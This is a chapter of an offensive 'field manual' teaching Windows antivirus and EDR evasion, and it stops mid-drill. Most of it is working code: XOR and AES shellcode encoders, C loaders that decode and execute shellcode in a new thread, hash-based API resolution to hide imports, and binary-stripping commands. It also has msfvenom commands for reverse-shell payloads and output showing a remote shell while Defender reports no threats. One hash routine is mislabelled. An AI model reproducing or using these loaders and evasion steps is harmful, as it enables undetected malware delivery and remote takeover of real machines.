# Chapter 12 — Antivirus Evasion: The Five-Gate Model

**VADER-RCE Field Manual**
**Prerequisite**: Ch09 (Malware Development), Ch10 (Code Injection), Ch11 (Rootkits)
**Drill**: DRILLS/12_av_evasion/

---

## Why You Need This

You built a loader in Chapter 09. You got a shell. Then you ran it against
a real target with Windows Defender enabled and it died in three seconds.
That's not a failure — that's the lesson.

Modern AV/EDR is not one wall. It's five gates operating at different layers,
at different times, checking different things. A payload that passes gate one
can still die at gate four. A payload that survives all five gates in a lab
can get caught by gate three the moment a new signature drops. The attack
surface is moving.

This chapter is about understanding EACH gate — what it checks, when it checks
it, and what it can't see. Once you understand the architecture, evasion isn't
a bag of tricks. It's a systematic answer to a systematic problem. Every technique
you learn here has a defender equivalent. You need to know both.

The five-gate model maps every detection layer in modern endpoint security.
IRON-DOME is the 22DIV operational evasion framework that addresses each gate
in sequence. You don't deploy IRON-DOME blind — you understand WHY each layer
exists, so when one technique stops working, you can adapt on the fly.

---

## WINDOWS SETUP

Everything in this chapter runs on Windows 11 natively — no WSL2 required
for the core tools. WSL2 is noted where it helps.

### Required Tools

| Tool | Purpose | Install Command |
|------|---------|----------------|
| Python 3.x | XOR encoder, AES encryptor scripts | Already on PATH. Verify: `python --version` |
| MinGW-w64 (GCC for Windows) | Compile C loaders natively | See below |
| MSVC / cl.exe | Compile with Microsoft toolchain | Install Visual Studio Build Tools (see below) |
| UPX | PE packer (basic, AV decrypts it — but useful to know) | `winget install upx.upx` |
| CFF Explorer | PE structure viewer — inspect import tables, sections | Download: ntcore.com/exsuite.php |
| PE-bear | Static PE analysis | Download: github.com/hasherezade/pe-bear/releases |
| x64dbg | Dynamic analysis / step through loader | Download: x64dbg.com |
| Process Hacker 2 | Live process memory inspection | `winget install processhacker.processhacker` |
| VirusTotal (web) | Test detection rate (DO NOT upload real ops binaries) | virustotal.com — no install |
| pycryptodome | Python AES/RC4 library | `pip install pycryptodome` |

**> ADMIN REQUIRED:** MinGW install, MSVC install, Process Hacker (for driver features).
All others run as standard user.

### Install MinGW-w64 (GCC for Windows)

```powershell
# Option A: winget (easiest)
winget install msys2.msys2
# Then in MSYS2 terminal:
# pacman -S mingw-w64-x86_64-gcc

# Option B: direct installer
# Download: github.com/niXman/mingw-builds-binaries/releases
# Get: x86_64-13.x.x-release-posix-seh-ucrt-rt_v11-revX.7z
# Extract to C:\mingw64\
# Add C:\mingw64\bin to PATH
```

**Verify MinGW:**
```powershell
x86_64-w64-mingw32-gcc --version
# Expected: x86_64-w64-mingw32-gcc.exe (x86_64-posix-seh-rev0, Built by MinGW-W64...) 13.x.x
```

### Install MSVC Build Tools (optional — for comparing compiler fingerprints)

```powershell
# Download Visual Studio Build Tools installer:
# aka.ms/vs/17/release/vs_BuildTools.exe
# In installer: select "Desktop development with C++"
# This gives you cl.exe and link.exe on PATH in Developer Command Prompt
```

**Verify MSVC (run in Developer Command Prompt):**
```cmd
cl
# Expected: Microsoft (R) C/C++ Optimizing Compiler Version 19.xx for x64
```

### Install pycryptodome

```powershell
pip install pycryptodome
python -c "from Crypto.Cipher import AES; print('OK')"
# Expected: OK
# Failure: ModuleNotFoundError — means pip installed pycrypto (old) not pycryptodome.
# Fix: pip uninstall pycrypto && pip install pycryptodome
```

### Verify Process Hacker

```powershell
# After winget install:
# Search Start: "Process Hacker"
# Launch as admin for full memory inspection features
# Expected: Task Manager-like window with Processes, Services, Network tabs
# Failure: "Access denied" errors on some columns = not running as admin
```

### No WSL2 Required

All tools in this chapter run natively on Windows. WSL2 is optional if you
want to use Linux tools (Binwalk, objdump) for cross-checking PE analysis.
Install WSL2 if needed:

```powershell
# Run as Administrator:
wsl --install
# Restart when prompted.
# Default distro: Ubuntu. Verify: wsl --list --verbose
```

---

## The Five-Gate Model

Modern endpoint defense is not a single scanner. It's five distinct detection
stages that fire at different points in a payload's lifecycle. Understanding
when each gate fires is the prerequisite for understanding what it can and
cannot see.

```
GATE 1: STATIC SIGNATURE
  When: File written to disk / downloaded
  What it checks: Byte sequences, import table strings, known shellcode patterns
  Blind to: Encrypted payloads, dynamically-resolved imports, novel code

GATE 2: HEURISTIC ANALYSIS
  When: File on disk + pre-execution analysis
  What it checks: Code structure, API call patterns, suspicious strings, PE anomalies
  Blind to: Obfuscated control flow, encrypted payloads, novel patterns

GATE 3: BEHAVIORAL DETECTION
  When: Process running — real-time API monitoring
  What it checks: System calls, memory operations (VirtualAlloc, WriteProcessMemory),
                  suspicious API chains, thread creation patterns
  Blind to: Direct/indirect syscalls that bypass ntdll hooks

GATE 4: MEMORY SCANNING
  When: Periodic scan of running process memory
  What it checks: Shellcode signatures, PE headers in private memory, known patterns
  Blind to: Encrypted sleep (payload re-encrypts itself between scans),
             PE header stomping (wipes MZ/PE sig after load)

GATE 5: NETWORK / CLOUD INTELLIGENCE
  When: C2 beacon leaves the machine
  What it checks: Traffic signatures, known C2 domain reputation, beacon timing patterns
  Blind to: Encrypted HTTPS C2, domain fronting, malleable C2 profiles,
             legitimate cloud redirectors

AFTER EACH GATE:
  Fail → payload terminated. Alert generated. Event logged.
  Pass → move to next gate.
```

You need to pass ALL five. This chapter maps every technique to the gate it defeats.

---

## Section 1 — Gate 1 Evasion: Static Signature Bypass

Static signature scanning happens at write-time. The AV engine reads the
file from disk and compares byte sequences against a database of known-bad
patterns. Defender also applies static analysis via AMSI to scripts and
memory regions that weren't written to disk.

The key insight: **if the scanner can't read your payload, it can't match it.**

### What a Signature Looks Like

```
Defender's signature database (simplified concept):
  RULE 1: if bytes[0x400:0x420] == {fc 48 83 e4 f0 ...} → MALICIOUS
  RULE 2: if any string == "cmd /c whoami" → SUSPICIOUS
  RULE 3: if import_table contains {"VirtualAlloc", "CreateRemoteThread",
          "WriteProcessMemory"} AND file_size < 10000 → SUSPICIOUS

These are not the real rules — the real engine is ML + signature hybrid.
But the principle is identical: PATTERN MATCHING AGAINST KNOWN BYTES.
```

### Technique 1A: XOR Encoding (Minimal, Fast)

XOR encoding scrambles every byte of your shellcode with a key. The encoded
blob contains none of the original bytes — no signature can match.

The decoder stub (which DOES contain known bytes) must itself be small and
clean enough to pass its own signature check. This is the tradeoff.

```python
#!/usr/bin/env python3
# xor_encoder.py — encode shellcode for static evasion
# Usage: python xor_encoder.py shellcode.bin 0x4D
# Output: C array of XOR-encoded bytes, ready to paste into your loader

import sys

# Read raw shellcode file (generated by msfvenom -f raw, or your custom payload)
with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

# XOR key — single byte. Change per build. Avoid 0x00 (nulls corrupt the byte).
key = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x4D

# XOR every byte with the key
encoded = bytes([b ^ key for b in shellcode])

# Print as C unsigned char array — paste directly into your loader .c file
print(f"// XOR key: 0x{key:02x} | Original size: {len(shellcode)} bytes")
print(f"unsigned char encoded_shellcode[] = {{")
for i, b in enumerate(encoded):
    if i % 16 == 0:
        print("    ", end="")          # indent
    print(f"0x{b:02x}, ", end="")     # each byte as hex
    if (i + 1) % 16 == 0:
        print()                        # newline every 16 bytes
print("\n};")
print(f"SIZE_T encoded_len = {len(encoded)};")
```

### Expected Output

```
// XOR key: 0x4d | Original size: 287 bytes
unsigned char encoded_shellcode[] = {
    0xb1, 0x05, 0xce, 0xa9, 0xbd, ...
};
SIZE_T encoded_len = 287;
```

**Failure looks like:** `FileNotFoundError: [Errno 2] No such file or directory: 'shellcode.bin'` — means you haven't generated shellcode yet. Generate with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f raw -o shellcode.bin`.

The corresponding C decoder runs at runtime, before executing the payload:

```c
// XOR decode stub — runs inside your loader at runtime
// Takes encoded shellcode, decodes it in-place before execution

void xor_decode(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;  // XOR assignment: decode each byte with the same key
                        // XOR is its own inverse: (x ^ key) ^ key == x
    }
}

// Usage in your loader's main():
xor_decode(encoded_shellcode, encoded_len, 0x4D); // 0x4D must match encoder key
// After this call, encoded_shellcode[] contains the original shellcode
```

**Why this works against Gate 1**: The AV scanner reads the file from disk
and sees the encoded blob — random-looking bytes that match no known signature.
The decode only happens in memory at runtime, after the file has already
passed the static check.

**Why this fails against Gate 4**: After the decode runs, the original
shellcode bytes are in memory. A memory scan at that point will find them.
See Section 4 for memory evasion.

### Technique 1B: AES-CBC Encryption (Proper Evasion)

Single-byte XOR is defeated by any scanner that tries all 256 keys. AES
with a 256-bit random key is not. Without the key, the ciphertext is
statistically indistinguishable from random noise.

```python
#!/usr/bin/env python3
# aes_encryptor.py — encrypt shellcode with AES-256-CBC for static evasion
# Usage: python aes_encryptor.py shellcode.bin
# Output: C arrays for key, IV, and encrypted blob

from Crypto.Cipher import AES        # pycryptodome — install: pip install pycryptodome
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import sys

with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

key = get_random_bytes(32)           # 256-bit key — random per build (critical!)
iv  = get_random_bytes(16)           # 128-bit IV — must be random, included with ciphertext

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(shellcode, AES.block_size))  # pad to 16-byte boundary

def to_c_array(name, data):
    """Format bytes as a C unsigned char array."""
    print(f"unsigned char {name}[] = {{")
    for i, b in enumerate(data):
        if i % 16 == 0:
            print("    ", end="")
        print(f"0x{b:02x}, ", end="")
        if (i + 1) % 16 == 0:
            print()
    print("\n};")
    print(f"SIZE_T {name}_len = {len(data)};\n")

to_c_array("aes_key", key)
to_c_array("aes_iv", iv)
to_c_array("enc_shellcode", ciphertext)
```

### Expected Output

```
unsigned char aes_key[] = {
    0x3a, 0xf1, 0x7c, 0x88, ...   // 32 bytes — different every run
};
SIZE_T aes_key_len = 32;

unsigned char aes_iv[] = {
    0xb9, 0x2d, ...               // 16 bytes
};
SIZE_T aes_iv_len = 16;

unsigned char enc_shellcode[] = {
    0xd4, 0x11, 0xa3, ...         // same size as original (+padding)
};
SIZE_T enc_shellcode_len = 304;
```

**Failure looks like:** `ModuleNotFoundError: No module named 'Crypto'` — run `pip install pycryptodome` (not pycrypto).

The C loader decrypts at runtime using Windows CNG (no external DLL needed):

```c
// AES-CBC decrypt using Windows CNG API
// No external library required — BCrypt is built into Windows
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")  // link BCrypt.lib

BOOL aes_decrypt(unsigned char *ciphertext, DWORD ct_len,
                 unsigned char *key,        DWORD key_len,
                 unsigned char *iv,
                 unsigned char **plaintext, DWORD *pt_len) {

    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_KEY_HANDLE hKey  = NULL;
    NTSTATUS status;

    // Open AES algorithm provider from Windows CNG
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    // Set mode to CBC (default is ECB — must set explicitly)
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    // Import the key bytes
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, key_len, 0);

    // First call: get required output buffer size
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL,
                  iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);

    // Allocate output buffer
    *plaintext = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, *pt_len);

    // Second call: perform actual decryption into buffer
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL,
                  iv, 16, *plaintext, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);

    // Clean up handles
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}
```

### Expected Output (compile check)

Compile with:
```cmd
cl loader.c /link bcrypt.lib
```
or with MinGW:
```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lbcrypt
```
**Failure looks like:** `cannot open input file 'bcrypt.lib'` (MSVC) — run from Developer Command Prompt, not regular cmd. With MinGW: `undefined reference to 'BCryptOpenAlgorithmProvider'` — add `-lbcrypt` to the link command.

### Technique 1C: Per-Vector Key Isolation (Rolling XOR)

Single-key XOR is vulnerable to frequency analysis. If your shellcode
contains many null bytes (common in PE files), the attacker sees many
repeated ciphertext bytes and can recover the key statistically.

Per-vector key isolation breaks this by using a different key byte for
each position — cycling through a longer key string:

```python
#!/usr/bin/env python3
# rolling_xor.py — multi-byte rolling XOR for per-vector key isolation
# Harder than single-byte XOR: no frequency analysis shortcut for the attacker

key = b"VADER0x1security22DIV"   # key bytes cycle: position i uses key[i % len(key)]

with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

# Each byte gets XOR'd with a DIFFERENT key byte — breaks statistical patterns
encoded = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

# Output C array
print(f'unsigned char rolling_key[] = "{key.decode()}";')
print(f"SIZE_T key_len = {len(key)};")
# ... then output encoded as C array same as above
```

The C decode loop:

```c
// Rolling XOR decode in C
unsigned char rolling_key[] = "VADER0x1security22DIV";  // must match encoder key
SIZE_T key_len = sizeof(rolling_key) - 1;               // -1 to exclude null terminator

for (SIZE_T i = 0; i < encoded_len; i++) {
    decoded[i] = encoded_shellcode[i] ^ rolling_key[i % key_len]; // cycle through key
}
```

---

## Layer 1 — XOR Encoder (Full Python Implementation)

### WHAT IT IS

A XOR encoder reads raw shellcode bytes, XORs each byte against a rolling
key, and outputs a C header file containing the encoded array. The C stub
includes that header, decodes at runtime, and executes via VirtualAlloc +
CreateThread. No plaintext shellcode bytes exist on disk at any point.

### WHY IT MATTERS

Static AV works by matching known byte sequences. Meterpreter's first 12
bytes (`\xfc\x48\x83\xe4\xf0\xe8`) are in every Defender signature database.
XOR transforms those bytes into a different byte at each position. Without
the key, the blob looks like noise. The signature database has nothing to
match against. Gate 1 is blind.

Single-byte XOR has one weakness: frequency analysis. Rolling key XOR (below)
closes that hole by using a different key byte per position.

### HOW TO BUILD IT

**Step 1 — Generate raw shellcode:**
```bash
# msfvenom on Kali or any Linux box
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shellcode.bin

# Verify size (should be ~460 bytes for this payload)
wc -c shellcode.bin
# Expected: 460 shellcode.bin
```

**Step 2 — Run the encoder (full script):**

```python
#!/usr/bin/env python3
# xor_encode_full.py
# Usage: python xor_encode_full.py shellcode.bin output_shellcode.h
# Produces a .h file you #include directly in your C loader.
# Rolling key XOR — each position uses a different key byte.

import sys
import os

def rolling_xor_encode(data: bytes, key: bytes) -> bytes:
    """XOR each byte with the corresponding key byte (cycled)."""
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def emit_c_header(encoded: bytes, key: bytes, out_path: str):
    """Write a C header containing the encoded array and key."""
    lines = []
    lines.append("#pragma once")
    lines.append("#include <windows.h>")
    lines.append("")
    # Encode the key itself as a raw byte array (not a string literal)
    lines.append(f"// Rolling XOR key — {len(key)} bytes")
    lines.append(f"static unsigned char SC_KEY[] = {{")
    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    lines.append(f"    {key_hex}")
    lines.append("};")
    lines.append(f"static SIZE_T SC_KEY_LEN = {len(key)};")
    lines.append("")
    lines.append(f"// XOR-encoded shellcode — {len(encoded)} bytes")
    lines.append(f"// Original size before encoding: {len(encoded)} bytes")
    lines.append(f"static unsigned char SC_ENCODED[] = {{")
    for i in range(0, len(encoded), 16):
        chunk = encoded[i:i+16]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_str},")
    lines.append("};")
    lines.append(f"static SIZE_T SC_LEN = {len(encoded)};")

    with open(out_path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"[+] Header written: {out_path}")
    print(f"[+] Shellcode size: {len(encoded)} bytes")
    print(f"[+] Key: {key.hex()}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} shellcode.bin output.h [key_hex]")
        sys.exit(1)

    sc_path  = sys.argv[1]
    out_path = sys.argv[2]
    # Key: use provided hex string, or default rolling key
    key_hex  = sys.argv[3] if len(sys.argv) > 3 else "5641444552307831"
    key      = bytes.fromhex(key_hex)

    with open(sc_path, "rb") as f:
        shellcode = f.read()

    encoded = rolling_xor_encode(shellcode, key)
    emit_c_header(encoded, key, out_path)
```

**Step 3 — C stub that includes the header, decodes, and executes:**

```c
// loader_xor.c
// Decodes XOR-encoded shellcode at runtime, executes via VirtualAlloc + CreateThread.
// Compile: x86_64-w64-mingw32-gcc loader_xor.c -o loader_xor.exe -s -O2
// No external libs required — kernel32 is always loaded.

#include <windows.h>
#include "output_shellcode.h"   // generated by xor_encode_full.py — contains SC_ENCODED, SC_KEY

// Decode in-place: XOR each encoded byte with the cycling key byte
// After this returns, SC_ENCODED[] contains the original plaintext shellcode
static void rolling_xor_decode(unsigned char *buf, SIZE_T len,
                                 unsigned char *key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];  // same XOR op — XOR is its own inverse
    }
}

int main(void) {
    // --- Step 1: Allocate RW memory for shellcode ---
    // RW first, not RWX — splitting alloc from protect reduces heuristic score
    LPVOID mem = VirtualAlloc(
        NULL,           // OS picks the address
        SC_LEN,         // size = encoded shellcode length
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // RW — not executable yet
    );
    if (!mem) return 1;  // allocation failed — bail

    // --- Step 2: Copy encoded shellcode into the allocation ---
    memcpy(mem, SC_ENCODED, SC_LEN);

    // --- Step 3: Decode in-place (XOR restores original bytes) ---
    // At this point, mem[] contains plaintext shellcode
    rolling_xor_decode((unsigned char *)mem, SC_LEN, SC_KEY, SC_KEY_LEN);

    // --- Step 4: Change permissions to RX (executable, no longer writable) ---
    DWORD old_protect;
    VirtualProtect(mem, SC_LEN, PAGE_EXECUTE_READ, &old_protect);

    // --- Step 5: Create a thread pointing at the shellcode ---
    HANDLE hThread = CreateThread(
        NULL,   // default security
        0,      // default stack size
        (LPTHREAD_START_ROUTINE)mem,  // shellcode is the thread function
        NULL,   // no parameter
        0,      // run immediately
        NULL    // don't need thread ID
    );
    if (!hThread) return 1;

    // Wait for shellcode thread to exit (for reverse shell: wait forever)
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup (usually not reached for a shell payload)
    VirtualFree(mem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    return 0;
}
```

**Compile command (MinGW):**
```bash
x86_64-w64-mingw32-gcc loader_xor.c -o loader_xor.exe -s -O2 -mwindows
```

**Compile command (MSVC, Developer Command Prompt):**
```cmd
cl /O2 /MT loader_xor.c /link /SUBSYSTEM:WINDOWS /OUT:loader_xor.exe
```

### EXPECTED OUTPUT

```
[+] Header written: output_shellcode.h
[+] Shellcode size: 460 bytes
[+] Key: 5641444552307831

# After running loader_xor.exe with a netcat listener:
# On attacker: nc -lvnp 4444
# On target: loader_xor.exe
# Expected in netcat:
Connection received from 192.168.1.50 port 4444
Microsoft Windows [Version 10.0.22631.3447]
(c) Microsoft Corporation. All rights reserved.

C:\Users\target>
```

Defender scan before encoding: **DETECTED** (meterpreter signature).
Defender scan after XOR encoding: scan the `.exe`, observe `No threats found`.

// DRILL: Generate shellcode with msfvenom, run xor_encode_full.py, compile loader_xor.c,
// scan with Defender, confirm no detection. Then decode the .h manually in Python and
// confirm the decoded bytes match the original shellcode.bin byte-for-byte.

---

## Section 2 — Gate 2 Evasion: Heuristic Analysis Bypass

Heuristic engines don't look for known bytes — they look for suspicious
PATTERNS. A loader that allocates memory, copies bytes into it, and executes
it is suspicious regardless of what those bytes are. The heuristic engine
says: "this code is doing loader-like things."

Gate 2 fires before execution. It looks at the binary's structure, its
import table, its strings, and sometimes emulates a few hundred instructions.

### Technique 2A: Dynamic Import Resolution

If "VirtualAlloc" appears in your import table, it's a flag. The string
"VirtualAlloc" in your binary's `.rdata` section is also a flag. Remove
both by resolving the function address at runtime via `GetProcAddress`.

```c
// BAD: static import — "VirtualAlloc" visible in PE import table AND .rdata
#include <windows.h>
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// AV sees: import table entry for VirtualAlloc in kernel32.dll = SUSPICIOUS

// GOOD: dynamic resolution — "VirtualAlloc" string removed from binary
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

HMODULE hKernel32 = GetModuleHandleA("kernel32.dll"); // kernel32 always loaded
pVirtualAlloc fnAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
void* mem = fnAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// AV sees: GetProcAddress and GetModuleHandleA — generic, present in countless benign binaries
```

### Technique 2B: Encrypted Function Name Resolution

"VirtualAlloc" as a plaintext string passed to `GetProcAddress` is still
a flag — the string lives in your binary's data section. XOR-encrypt the
function names and decrypt at runtime:

```c
// XOR-encrypted function name trick
// Pre-encrypt "VirtualAlloc" with key 0x22:
// V=0x56 ^ 0x22 = 0x74, i=0x69 ^ 0x22 = 0x4b, r=0x72 ^ 0x22 = 0x50 ...

unsigned char enc_virtualalloc[] = { 0x74, 0x4b, 0x50, 0x56, 0x57, 0x41, 0x52,
                                     0x52, 0x45, 0x63, 0x7a, 0x5a, 0x5a };
char func_name[32] = {0};

// Decrypt at runtime into a stack buffer
for (int i = 0; i < sizeof(enc_virtualalloc); i++) {
    func_name[i] = enc_virtualalloc[i] ^ 0x22;  // reveals "VirtualAlloc"
}

// Now call GetProcAddress with the decrypted name
// No plaintext "VirtualAlloc" string exists in the binary at rest
pVirtualAlloc fnAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandleA("kernel32.dll"), func_name);
```

### Technique 2C: API Hashing

Eliminate function NAME strings entirely. Walk the export table yourself
and match by hash:

```c
// DJBX33A hash — 32-bit, fast, used in many loaders
// Pre-compute: hash("VirtualAlloc") → 0x97BC2574 (verify offline)

DWORD hash_name(const char *name) {
    DWORD h = 0x811c9dc5;               // FNV offset basis
    while (*name) {
        h ^= (unsigned char)*name++;    // XOR with current character byte
        h *= 0x01000193;                // FNV prime — mixes bits
    }
    return h;
}

// Walk kernel32.dll's export table manually:
// (no string "VirtualAlloc" anywhere in your binary)
PVOID get_proc_by_hash(HMODULE base, DWORD target_hash) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)base + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names    = (DWORD*)((BYTE*)base + exports->AddressOfNames);
    WORD  *ordinals = (WORD*) ((BYTE*)base + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((BYTE*)base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)base + names[i]);
        if (hash_name(name) == target_hash) {    // compare hash — no string compare
            return (PVOID)((BYTE*)base + funcs[ordinals[i]]);
        }
    }
    return NULL;
}
```

### Technique 2D: PE Anomaly Cleanup

Heuristic engines also flag PE anomalies — indicators that a file is
not what it claims to be, or was produced by a known malware builder.

```bash
# Compile with MinGW — strip all debugging symbols and extra sections
x86_64-w64-mingw32-gcc loader.c -o loader.exe \
  -O2 \
  -s \
  -mwindows \
  -static \
  -fvisibility=hidden

# Remove the GCC comment section (contains compiler version string)
x86_64-w64-mingw32-strip --remove-section=.comment loader.exe

# Verify PE structure with CFF Explorer or PE-bear:
# - No .comment section
# - No debug directory
# - Import table: only GetProcAddress, LoadLibraryA (or nothing if fully dynamic)
```

### Expected Output

Open the compiled binary in CFF Explorer. Under "Import Directory":
- **Before**: entries for `VirtualAlloc`, `WriteProcessMemory`, `CreateThread`
- **After**: entries only for `GetProcAddress`, `GetModuleHandleA` (or empty if fully hash-based)

**Failure looks like:** `.comment section still present` after strip — confirm you ran `x86_64-w64-mingw32-strip --remove-section=.comment`, not just `strip`. Check the section list in PE-bear.

---

## Layer 2 — Dynamic API Resolution (Full C Implementation)

### WHAT IT IS

Dynamic API resolution means resolving function addresses at runtime via
GetProcAddress instead of the linker's import table. The resulting binary
has no record of which dangerous APIs it uses — the import table is clean.

### WHY IT MATTERS

The PE import table is one of the first things heuristic scanners inspect.
A binary importing `VirtualAlloc` + `WriteProcessMemory` + `CreateThread`
from kernel32 is a textbook shellcode loader. That combination triggers
heuristic rules regardless of what the payload does.

Dynamic resolution removes those entries. CFF Explorer will show your import
table containing only `GetProcAddress` and `GetModuleHandleA` — both present
in thousands of legitimate binaries (browsers, updaters, installers).

The function NAME strings ("VirtualAlloc" etc.) must also be removed.
The full implementation below combines hash-based export walking so no
function name string ever appears in the binary.

### HOW TO BUILD IT

```c
// dynapi.c — full dynamic API resolution with FNV hash-based export walking
// No dangerous import table entries. No function name strings.
// Compile: x86_64-w64-mingw32-gcc dynapi.c -o loader_dynapi.exe -s -O2

#include <windows.h>

// ---- FNV-1a 32-bit hash ----
// Compute offline for each API you need:
//   python3 -c "
//   h=0x811c9dc5
//   for c in b'VirtualAlloc': h=(h^c)*0x01000193&0xFFFFFFFF
//   print(hex(h))"
// VirtualAlloc  -> 0x97bc2574  (verify on your build — hash of exact string)
// VirtualProtect-> 0xe857f6a2
// CreateThread  -> 0x27c3b7a1

#define HASH_VIRTUAL_ALLOC    0x97bc2574
#define HASH_VIRTUAL_PROTECT  0xe857f6a2
#define HASH_CREATE_THREAD    0x27c3b7a1

static DWORD fnv1a(const char *s) {
    DWORD h = 0x811c9dc5;           // FNV offset basis
    while (*s) {
        h ^= (unsigned char)*s++;  // XOR byte into hash
        h *= 0x01000193;           // multiply by FNV prime
    }
    return h;
}

// Walk a module's export directory, return function pointer matching hash
static FARPROC resolve_by_hash(HMODULE base, DWORD target) {
    // Parse DOS header → NT headers → export directory
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                      .VirtualAddress;
    if (!exp_rva) return NULL;   // no export directory in this module

    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + exp_rva);

    // Pointers into the three export arrays
    DWORD *name_rvas  = (DWORD*)((BYTE*)base + exp->AddressOfNames);
    WORD  *ordinals   = (WORD*) ((BYTE*)base + exp->AddressOfNameOrdinals);
    DWORD *func_rvas  = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)base + name_rvas[i]);
        if (fnv1a(name) == target) {
            // Found: compute actual address from function RVA
            return (FARPROC)((BYTE*)base + func_rvas[ordinals[i]]);
        }
    }
    return NULL;  // not found
}

// ---- Function pointer typedefs ----
// These replace the standard headers — no need to include anything
// that would drag in the import records.
typedef LPVOID (WINAPI *t_VirtualAlloc)  (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *t_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *t_CreateThread)  (LPSECURITY_ATTRIBUTES, SIZE_T,
                                           LPTHREAD_START_ROUTINE,
                                           LPVOID, DWORD, LPDWORD);

int main(void) {
    // GetModuleHandle for kernel32 — this IS in the import table,
    // but it's present in every Windows binary; not a red flag.
    HMODULE k32 = GetModuleHandleA("kernel32.dll");

    // Resolve the three dangerous APIs by hash — no name strings in binary
    t_VirtualAlloc   pVA  = (t_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
    t_VirtualProtect pVP  = (t_VirtualProtect) resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
    t_CreateThread   pCT  = (t_CreateThread)   resolve_by_hash(k32, HASH_CREATE_THREAD);

    if (!pVA || !pVP || !pCT) return 1;  // resolution failed — bail

    // From here: use pVA / pVP / pCT exactly like VirtualAlloc / VirtualProtect / CreateThread
    // Example: allocate RW memory
    LPVOID mem = pVA(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    // (copy shellcode into mem, then:)
    DWORD old;
    pVP(mem, 4096, PAGE_EXECUTE_READ, &old);

    HANDLE ht = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(ht, INFINITE);
    return 0;
}
```

**Compile:**
```bash
x86_64-w64-mingw32-gcc dynapi.c -o loader_dynapi.exe -s -O2
```

### CFF Explorer Verification Step

1. Open `loader_dynapi.exe` in CFF Explorer (ntcore.com/exsuite.php).
2. Click **Import Directory** in the left panel.
3. **Before (static imports)**: You see `kernel32.dll` → `VirtualAlloc`, `VirtualProtect`, `CreateThread`
4. **After (hash resolution)**: You see `kernel32.dll` → `GetModuleHandleA` ONLY.
   No VirtualAlloc. No VirtualProtect. No CreateThread.

### EXPECTED OUTPUT

```
# strings loader_dynapi.exe | grep -i virtual
(no output)

# strings loader_dynapi.exe | grep -i thread
(no output)

# CFF Explorer → Import Directory:
kernel32.dll
  GetModuleHandleA
```

// DRILL: Compute FNV-1a hashes for WriteProcessMemory and OpenProcess.
// Add them to dynapi.c. Resolve both. Call WriteProcessMemory to write
